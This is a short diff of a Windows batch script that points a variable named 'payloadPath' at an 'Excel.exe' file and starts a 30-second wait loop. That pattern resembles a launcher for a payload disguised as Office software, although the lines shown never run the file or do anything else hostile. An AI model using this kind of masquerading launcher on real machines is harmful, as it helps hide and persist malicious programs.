@@ -1,5 +1,5 @@
 @echo off
-set payloadPath=C:\Users\Public\ Excel.exe
+set payloadPath=%~dp0Excel.exe
 
 :loop
 timeout /t 30 /nobreak
